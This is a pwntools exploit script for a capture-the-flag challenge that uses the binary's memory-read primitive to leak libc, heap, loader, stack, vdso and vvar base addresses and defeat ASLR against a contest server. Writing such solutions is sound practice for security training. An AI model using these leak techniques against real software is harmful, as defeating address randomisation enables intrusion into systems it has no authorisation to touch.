from pwn import *
from icecream import ic

elf = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challs.pwnoh.io", 13375)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x0000000000401746
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, drop = True)
def rl(): return io.recvline()
def gad(a, b): return ROP(a).find_gadget([f"pop {b}", "ret"])[0]
def i(): return io.interactive()

io = start()

elf.address = 0x400000

sl(str(0x0000000000404020))
ru("gathered ")
leak = int(ru(" "))
libc.address = leak - libc.sym['puts']

sl(str(libc.address + 0x21a3c0))
ru("gathered ")
leak = int(ru(" "))
heap_address = leak

sl(str(0x0000000000404010))
ru("gathered ")
leak = int(ru(" "))
ld.address = leak - 0x15d30

sl(str(libc.address + 0x21b530))
ru("gathered ")
leak = int(ru(" "))
stack_address = leak - 0x2079f + 1972 - 0x1000 # guessed

sl(str(ld.address + 0x39dd8))
# sl(str(stack_address + 0x1ebe0))
ru("gathered ")
leak = int(ru(" "))
vdso_address = leak - 0x8c0 - 0x300 # bruted offset :P
vvar_address = vdso_address - 0x4000


sl(b'0')
ic(hex(libc.address))
ic(hex(heap_address))
ic(hex(elf.address))
ic(hex(ld.address))
ic(hex(stack_address))
ic(hex(vvar_address))
ic(hex(vdso_address))

sl(str(elf.address))
sl(str(heap_address))
sl(str(libc.address))
sl(str(ld.address))
sl(str(stack_address))
sl(str(vvar_address))
sl(str(vdso_address))
sl(str(0xffffffffff600000)) # vsyscall had a fixed addr?

io.interactive()
